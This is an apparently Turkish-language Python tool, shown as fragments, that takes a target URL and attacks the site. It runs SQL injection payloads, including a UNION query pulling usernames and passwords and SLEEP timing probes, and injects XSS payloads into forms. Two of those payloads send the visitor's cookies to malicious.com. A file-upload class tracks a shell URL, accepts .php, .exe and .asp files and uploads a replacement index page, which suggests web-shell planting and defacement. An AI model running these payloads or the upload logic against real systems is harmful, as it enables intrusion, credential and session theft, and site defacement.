...
# Ekranı temizleme fonksiyonu (Windows ve Linux uyumlu)
def temizle():
...
# Giriş ekranı ve ASCII logo
def giris_ekrani():
    temizle()

    # ASCII logo (hata düzeltildi)
    ascii_logo = r"""
\033[91m
...
"""
    ...
    print(f"\033[92m{ascii_logo}\033[0m")  # Yeşil ASCII logo
    print(f"\033[91m{slogan}\033[0m")      # Kırmızı slogan
...
def sistem_baslat():
    global durum
    if durum == "Aktif":
        print("[!] Sistem zaten aktif.")
    else:
        durum = "Aktif"
        print("[✓] Sistem başlatıldı.")
        log_yaz("Sistem başlatıldı.")

# Sistemi durdurma fonksiyonu
def sistem_durdur():
    global durum
    if durum == "Pasif":
        print("[!] Sistem zaten pasif.")
    else:
        durum = "Pasif"
        print("[✓] Sistem durduruldu.")
        log_yaz("Sistem durduruldu.")

# Sistem durumunu gösterme fonksiyonu
def durum_goster():
    print(f"[i] Sistem Durumu: {durum}")
    log_yaz(f"Durum sorgulandı: {durum}")

# Güvenlik başlıkları için gerekli başlıklar listesi
gerekli_basliklar = [
    "Content-Security-Policy",  # XSS ve dış kaynaklardan gelebilecek tehditlere karşı koruma
    "Strict-Transport-Security",  # HTTPS zorunluluğu
    "X-Content-Type-Options",  # MIME tipi saptamalarına karşı koruma
    "X-Frame-Options",  # Clickjacking saldırılarına karşı koruma
    "X-XSS-Protection",  # Tarayıcı bazlı XSS koruması
    "Referrer-Policy",  # Referrer bilgisi sızdırma engelleme
    "Permissions-Policy",  # Web API'lerine erişim politikası
    "Cache-Control",  # Önbellek kontrolü
    "Feature-Policy",  # Tarayıcı özelliklerinin güvenli kullanımına izin verme
    "X-Permitted-Cross-Domain-Policies",  # Flash/Java uygulamaları için güvenlik kontrolü
    "Access-Control-Allow-Origin",  # CORS (Cross-Origin Resource Sharing) başlığı
]

# Başlık gücü kontrolü
def header_strength_check(header, header_value):
    if header == "Strict-Transport-Security":
        ...
        # Bu kısım Policy-Controlled Features listesine göre güncellenmeli
        # Örneğin, "geolocation" veya "notifications" yerine daha genel bir kontrol yapılabilir.
        # Basitlik adına şimdilik böyle bırakıldı.
...
# SQL Injection testi fonksiyonu
def sql_injection_test(url, dil="TR"):
    ...
    try:
        # Genel payloadlar ile test
        for payload in sql_payloads:
            test_url = url + payload
            response = requests.get(test_url, timeout=10)

            # Basit bir kontrol, gerçek hayatta daha gelişmiş olmalı
        ...
        # URL parametreleri üzerinden test
        ...
        for param in ["' AND 1=1 --", "' AND 1=2 --", "' AND 'a'='a' --", "' AND 'a'!='a' --"]:
            ...
            # Blind SQLi için daha sofistike kontroller gerekir (örneğin sayfa içeriği veya zaman farkı)
            # Şimdilik hata tabanlı bir kontrol yapılıyor.
            if "error" in response.text.lower():
        ...
        for payload in ["' UNION SELECT NULL, username, password FROM users --", "' UNION SELECT 1,2,3 --"]:
            ...
            # Union-based için beklenen çıktının sayfada olup olmadığı kontrol edilir.
        ...
        for payload in ["' OR SLEEP(5) --", "' AND 1=1 AND SLEEP(5) --"]:
            ...
            if (end_time - start_time) > 4.5: # 5 saniyeden biraz daha az bir gecikme beklenir
...
xss_payloads = [
    ...
    "<a href='javascript:alert(1)'>Click me</a>",  # JavaScript içeren XSS
    "<iframe src='javascript:alert(1)'></iframe>",  # iframe XSS
    "<body onload=alert('XSS')>",  # Body taginde XSS
    "<input onfocus=alert('XSS') autofocus>",  # Input taginde XSS
    "<script>window.location='http://malicious.com?cookie='+document.cookie</script>",  # Cookie hijacking XSS
    "<script>document.location='http://malicious.com?cookie='+document.cookie</script>",  # Redirect XSS
    "<style>body{background:url('javascript:alert(1)');}</style>",  # CSS XSS
    "<img src='x' onerror='alert(1)' onload='alert(1)'>",  # Combined XSS
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",  # Meta refresh XSS
    "<script>eval('alert(1)')</script>",  # eval ile XSS
    "<script>setTimeout(function(){alert(1)}, 1000);</script>",  # setTimeout ile XSS
    "<script>setInterval(function(){alert(1)}, 1000);</script>",  # setInterval ile XSS
    "<script>document.write('<img src=\"x\" onerror=\"alert(1)\">')</script>",  # document.write ile XSS
    "<script>document.body.appendChild(document.createElement('img')).setAttribute('src','x');</script>",  # DOM Manipülasyonu
]

# XSS testi fonksiyonu
    ...
    try:
        ...
        for form in forms:
            ...
            for input_field in inputs:
                ...
                if name:
                    data[name] = xss_payloads[0]  # Her form alanına ilk payload'ı ekle

            # Form action URL'sini tamamlama
            if action and not action.startswith("http"):
                action_url = urlparse(url)._replace(path=action).geturl()
            else:
                action_url = action if action else url # Eğer action yoksa mevcut URL'yi kullan
...
# BeliZaafiyet sınıfı (Dosya yükleme zafiyeti için)
class BeliZaafiyet:
    def __init__(self, url):
        self.url = url
        self.shell_url = None
        self.index_url = None
        self.upload_dir = "uploads" # Varsayılan yükleme dizini
    ...
    def test_file_upload(self):
        ...
        test_url = f"{self.url}/upload"  # Yükleme URL'si burada varsayılıyor
        # Test için basit bir dosya oluştur
    ...
    def validate_file(self, file_path):
        allowed_extensions = ['.php', '.exe', '.jsp', '.html', '.txt', '.asp', '.aspx'] # Daha fazla uzantı eklendi
        max_size = 5 * 1024 * 1024  # Maksimum dosya boyutu (5MB'a çıkarıldı)
    ...
    def upload_file(self, file_path, file_type):
        ...
        upload_url = f"{self.url}/upload" # Yükleme URL'si burada varsayılıyor
        files = {'file': (os.path.basename(file_path), open(file_path, 'rb'))}

        try:
            response = requests.post(upload_url, files=files, timeout=30) # Timeout artırıldı
            if response.status_code == 200 and ("uploaded" in response.text.lower() or "success" in response.text.lower()):
                # Yüklenen dosyanın URL'sini tahmin etmeye çalış
    ...
    def upload_index(self):
        ...
        if not index_file_path:
            ...
            # Varsayılan index.html dosyası yoksa oluştur
...
def main():
    ...
    # Kullanıcıdan URL al (sadece bir kez)
    target_url = input("Hedef URL'yi girin (örneğin, http://site.com): ").strip()
    if not target_url:
        print("[!] Hedef URL boş bırakılamaz. Çıkılıyor...")
        sys.exit(1)

    # BeliZaafiyet sınıfı örneği oluştur
    ...
    while True:
        try:
            ...
            if komut == "start":
                ...
                print("[?] Bilinmeyen komut. 'help' yaz yardım al.")
